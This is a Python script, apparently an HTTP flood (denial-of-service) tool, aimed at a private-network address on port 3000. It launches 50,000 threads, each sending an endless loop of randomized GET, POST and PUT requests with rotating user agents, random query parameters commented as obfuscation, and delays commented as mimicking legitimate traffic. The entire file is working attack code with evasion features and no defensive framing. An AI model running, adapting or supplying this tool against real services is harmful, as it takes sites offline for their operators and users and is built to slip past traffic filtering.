import requests
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Target URL
url = "http://172.28.80.1:3000/#/"

# List of user agents to rotate
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.78 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",
]
# Generate random query parameters to obfuscate the request
def generate_random_query():
    query = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return {query: query}

# Generate random data for PUT and POST requests
def generate_random_data():
    return {
        ''.join(random.choices(string.ascii_letters, k=16)): ''.join(random.choices(string.ascii_letters + string.digits + string.printable, k=200))
        for _ in range(7)
    }



def send_request(url):
    while True:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Referer": url
            }
            params = generate_random_query()
            data = generate_random_data()
            
            # Randomly choose the request type with higher probability for PUT and POST
            request_type = random.choices(['GET', 'POST', 'PUT'], weights=[1, 2, 3])[0]
            
            if request_type == 'GET':
                response = requests.get(url, headers=headers, params=params)
            elif request_type == 'POST':
                response = requests.post(url, headers=headers, data=data)
            elif request_type == 'PUT':
                response = requests.put(url, headers=headers, data=data)
            
            print(f"{request_type} request sent! Status code: {response.status_code}")
            time.sleep(random.uniform(0.5, 2.0))  # Adding delay to mimic legitimate traffic
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            break

def main():
    website_url = url  # Example URL that returns status 200
    num_threads = 50000

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_request, website_url) for _ in range(num_threads)]

        for future in as_completed(futures):
            future.result()

if __name__ == "__main__":
    main()
